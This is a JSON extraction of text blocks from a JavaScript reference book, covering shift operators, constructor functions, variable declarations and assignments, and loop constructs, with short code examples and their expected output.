    {
        "text": "Section 15.2: Shift Operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Bitwise shifting can be thought as \"moving\" the bits either left or right, and hence changing the value of the data operated on.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Left Shift",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The left shift operator  ( value )   <<   ( shift amount )  will shift the bits to the left by  ( shift amount )  bits; the new bits coming in from the right will be  0 's:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "5   <<   2   =>   20",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  5:      0..000101 // 20:      0..010100 <= adds two 0's to the right",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Right Shift ( Sign-propagating )",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The right shift operator  ( value )   >>   ( shift amount )  is also known as the \"Sign-propagating right shift\" because it keeps the sign of the initial operand. The right shift operator shifts the  value  the speci\ufb01ed  shift amount  of bits to the right. Excess bits shifted o\ufb00 the right are discarded. The new bits coming in from the left will be based on the sign of the initial operand. If the left-most bit was  1  then the new bits will all be  1  and vice-versa for  0 's.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "20   >>   2   =>   5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// 20:      0..010100 //  5:      0..000101 <= added two 0's from the left and chopped off 00 from the right",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- 5   >>   3   =>   - 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -5:      1..111011 // -2:      1..111111 <= added three 1's from the left and chopped off 011 from the right",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Right Shift ( Zero \ufb01ll )",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The zero-\ufb01ll right shift operator  ( value )   >>>   ( shift amount )  will move the bits to the right, and the new bits will be  0 's. The  0 's are shifted in from the left, and excess bits to the right are shifted o\ufb00 and discarded. This means it can make negative numbers into positive ones.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "- 30   >>>   2   =>   1073741816",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//       -30:      111..1100010 //1073741816:      001..1111000",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Zero-\ufb01ll right shift and sign-propagating right shift yield the same result for non negative numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 151",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 16: Constructor functions",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 16.1: Declaring a constructor function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Constructor functions are functions designed to construct a new object. Within a constructor function, the keyword this  refers to a newly created object which values can be assigned to. Constructor functions \"return\" this new object automatically.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Cat ( name )   {    this . name   =  name ;    this . sound   =   \"Meow\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Constructor functions are invoked using the  new  keyword:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  cat  =   new  Cat ( \"Tom\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "cat. sound ;   // Returns \"Meow\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Constructor functions also have a  prototype  property which points to an object whose properties are automatically inherited by all objects created with that constructor:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Cat. prototype . speak   =   function ()   {   console. log ( this . sound ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "cat. speak ();   // Outputs \"Meow\" to the console",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Objects created by constructor functions also have a special property on their prototype called  constructor , which points to the function used to create them:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "cat. constructor   // Returns the `Cat` function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Objects created by constructor functions are also considered to be \"instances\" of the constructor function by the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "instanceof  operator:",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "cat  instanceof  Cat  // Returns \"true\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 152",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 17: Declarations and Assignments",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 17.1: Modifying constants",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Declaring a variable  const  only prevents its value from being  replaced  by a new value.  const  does not put any restrictions on the internal state of an object. The following example shows that a value of a property of a  const object can be changed, and even new properties can be added, because the object that is assigned to  person  is modi\ufb01ed, but not  replaced .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  person  =   {     name :   \"John\" }; console. log ( 'The name of the person is' ,  person. name ); person. name   =   \"Steve\" ; console. log ( 'The name of the person is' ,  person. name ); person. surname   =   \"Fox\" ; console. log ( 'The name of the person is' ,  person. name ,   'and the surname is' ,  person. surname );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Result:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The name of the person is John The name of the person is Steve The name of the person is Steve and the surname is Fox",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example we've created constant object called  person  and we've reassigned  person. name  property and created new  person. surname  property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.2: Declaring and initializing constants",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can initialize a constant by using the  const  keyword.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =   100 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  bar  =   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  person  =   {  name :   \"John\"   }; const  fun  =   function   ()   =   {   /* ... */   }; const  arrowFun  =   ()   =>   /* ... */   ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Important",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You must declare and initialize a constant in the same statement.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.3: Declaration",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are four principle ways to declare a variable in JavaScript: using the  var ,  let  or  const  keywords, or without a keyword at all (\"bare\" declaration). The method used determines the resulting scope of the variable, or reassignability in the case of  const . The  var  keyword creates a function-scope variable. The  let  keyword creates a block-scope variable. The  const  keyword creates a block-scope variable that cannot be reassigned. A bare declaration creates a global variable.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   'foo' ;      // Function-scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 153",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  b  =   'foo' ;      // Block-scope",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  c  =   'foo' ;    // Block-scope & immutable reference",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Keep in mind that you can't declare constants without initializing them at the same time.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo ;   // \"Uncaught SyntaxError: Missing initializer in const declaration\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "(An example of keyword-less variable declaration is not included above for technical reasons. Continue reading to see an example.)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.4: Unde\ufb01ned",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Declared variable without a value will have the value  undefined",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( a );   // logs: undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Trying to retrieve the value of undeclared variables results in a ReferenceError. However, both the type of undeclared and unitialized variables is \"unde\ufb01ned\":",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( typeof  a  ===   \"undefined\" );   // logs: true console. log ( typeof  variableDoesNotExist  ===   \"undefined\" );   // logs: true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 17.5: Data Types",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript variables can hold many data types: numbers, strings, arrays, objects and more:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  length  =   16 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// String",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  message  =   \"Hello, World!\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  carNames  =   [ 'Chevrolet' ,   'Nissan' ,   'BMW' ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  person  =   {     firstName :   \"John\" ,     lastName :   \"Doe\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "JavaScript has dynamic types. This means that the same variable can be used as di\ufb00erent types:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a ;                // a is undefined var  a  =   5 ;            // a is a Number var  a  =   \"John\" ;       // a is a String",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 17.6: Mathematic operations and assignment",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Increment by",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   9 ,    b  =   3 ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 154",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  +=  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  will now be 12 This is functionally the same as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  =  b  +  a ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Decrement by",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   9 ,    b  =   3 ;    b  -=  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  will now be 6 This is functionally the same as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  =  b  -  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Multiply by",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   5 ,    b  =   3 ;    b  *=  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  will now be 15 This is functionally the same as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  =  b  *  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Divide by",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   3 ,    b  =   15 ;    b  /=  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  will now be 5 This is functionally the same as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  =  b  /  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Raised to the power of",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   3 ,    b  =   15 ;    b  **=  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  will now be 3375 This is functionally the same as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "b  =  b  **  a ;   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 155",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.7: Assignment",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To assign a value to a previously declared variable, use the assignment operator,  = :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =   6 ; b  =   \"Foo\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As an alternative to independent declaration and assignment, it is possible to perform both steps in one statement:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   6 ; let  b  =   \"Foo\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is in this syntax that global variables may be declared without a keyword; if one were to declare a bare variable without an assignment immediately afterword, the interpreter would not be able to di\ufb00erentiate global declarations  a;  from references to variables  a; .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "c  =   5 ; c  =   \"Now the value is a String.\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myNewGlobal ;      // ReferenceError",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note, however, that the above syntax is generally discouraged and is not strict-mode compliant. This is to avoid the scenario in which a programmer inadvertently drops a  let  or  var  keyword from their statement, accidentally creating a variable in the global namespace without realizing it. This can pollute the global namespace and con\ufb02ict with libraries and the proper functioning of a script. Therefore global variables should be declared and initialized using the  var  keyword in the context of the window object, instead, so that the intent is explicitly stated. Additionally, variables may be declared several at a time by separating each declaration (and optional value assignment) with a comma. Using this syntax, the var and let keywords need only be used once at the beginning of each statement.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "globalA  =   \"1\" ,  globalB  =   \"2\" ; let  x ,  y  =   5 ; var  person  =   'John Doe' ,     foo ,     age  =   14 ,     date  =   new  Date ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice in the preceding code snippet that the order in which declaration and assignment expressions occur ( var  a , b ,  c  =   2 ,  d ; ) does not matter. You may freely intermix the two. Function declaration e\ufb00ectively creates variables, as well.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 156",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 18: Loops",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 18.1: Standard \"for\" loops",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Standard usage",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ;  i  <   100 ;  i ++)   {     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 1 ... 99",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Multiple declarations",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Commonly used to cache the length of an array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [ 'a' ,   'b' ,   'c' ]; for   ( var  i  =   0 ;  i  <  array. length ;  i ++)   {     console. log ( array [ i ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 'a' 'b' 'c'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Changing the increment",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ;  i  <   100 ;  i  +=   2   /* Can also be: i = i + 2 */ )   {     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 2 4 ... 98",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Decremented loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   100 ;  i  >= 0 ;  i --)   {     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 157",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Expected output: 100 99 98 ... 0",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.2: \"for ... of\" loop",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "const  iterable  =   [ 0 ,   1 ,   2 ]; for   ( let  i of iterable )   {     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 1 2 The advantages from the for...of loop are: This is the most concise, direct syntax yet for looping through array elements It avoids all the pitfalls of for...in Unlike  forEach () , it works with break, continue, and return",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Support of for...of in other collections Strings",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for...of will treat a string as a sequence of Unicode characters:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  string  =   \"abc\" ; for   ( let  chr of string )   {   console. log ( chr ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: a b c Sets for...of works on Set objects.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Note :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A Set object will eliminate duplicates. Please  check this reference  for  Set ()  browser support.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 158",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  names  =   [ 'bob' ,   'alejandro' ,   'zandra' ,   'anna' ,   'bob' ]; const  uniqueNames  =   new  Set ( names ); for   ( let  name of uniqueNames )   {   console. log ( name ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: bob alejandro zandra anna Maps You can also use for...of loops to iterate over Maps. This works similarly to arrays and sets, except the iteration variable stores both a key and a value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ()   . set ( 'abc' ,   1 )   . set ( 'def' ,   2 ) for   ( const  iteration of map )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( iteration )   //will log ['abc', 1] and then ['def', 2] }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use destructuring assignment to capture the key and the value separately:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ()   . set ( 'abc' ,   1 )   . set ( 'def' ,   2 ) for   ( const   [ key ,  value ]  of map )   {   console. log ( key  +   ' is mapped to '   +  value ) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/*Logs:   abc is mapped to 1   def is mapped to 2 */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Objects",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for...of loops  do not  work directly on plain Objects; but, it is possible to iterate over an object \u2019 s properties by switching to a for...in loop, or using  Object. keys () :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  someObject  =   {  name :   'Mike'   }; for   ( let  key of Object. keys ( someObject ))   {   console. log ( key  +   \": \"   +  someObject [ key ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 159",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "name: Mike",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.3: \"for ... in\" loop",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Warning",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for...in is intended for iterating over object keys, not array indexes.  Using it to loop through an array is generally discouraged . It also includes properties from the prototype, so it may be necessary to check if the key is within the object using  hasOwnProperty . If any attributes in the object are de\ufb01ned by the defineProperty / defineProperties  method and set the param  enumerable :   false , those attributes will be inaccessible.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  object  =   { \"a\" : \"foo\" ,   \"b\" : \"bar\" ,   \"c\" : \"baz\" };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// `a` is inaccessible",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( object  ,   'a' ,   {         enumerable :   false , }); for   ( var  key  in  object )   {      if   ( object. hasOwnProperty ( key ))   {       console. log ( 'object.'   +  key  +   ', '   +  object [ key ]);      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: object.b, bar object.c, baz",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.4: \"while\" Loops",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Standard While Loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A standard while loop will execute until the condition given is false:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   0 ; while  ( i  <   100 )   {     console. log ( i );     i ++; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 1 ... 99",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Decremented loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   100 ; while  ( i  >   0 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 160",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    console. log ( i );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    i --;   /* equivalent to i=i-1 */ }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 100 99 98 ... 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Do...while Loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A do...while loop will always execute at least once, regardless of whether the condition is true or false:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   101 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "do   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( i ); }  while  ( i  <   100 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 101",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.5: \"continue\" a loop",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Continuing a \"for\" Loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When you put the  continue  keyword in a for loop, execution jumps to the update expression ( i ++  in the example):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  i  =   0 ;  i  <   3 ;  i ++)   {      if   ( i  ===   1 )   {          continue ;      }     console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 2",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Continuing a While Loop",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When you  continue  in a while loop, execution jumps to the condition ( i  <   3  in the example):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   0 ; while  ( i  <   3 )   {      if   ( i  ===   1 )   {         i  =   2 ;          continue ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 161",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     }     console. log ( i );     i ++; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Expected output: 0 2",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.6: Break speci\ufb01c nested loops",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We can name our loops and break the speci\ufb01c one when necessary.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "outerloop : for   ( var  i  =   0 ; i < 3 ; i ++){     innerloop :      for   ( var  j  =   0 ; j  < 3 ;  j ++){         console. log ( i );         console. log ( j );          if   ( j  ==   1 ){              break  outerloop ;               }      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: 0 0 0 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.7: \"do ... while\" loop",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  availableName ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "do   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    availableName  =  getRandomName (); }  while  ( isNameUsed ( name ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A  do  while  loop is guaranteed to run at least once as it's condition is only checked at the end of an iteration. A traditional  while  loop may run zero or more times as its condition is checked at the beginning of an iteration.",
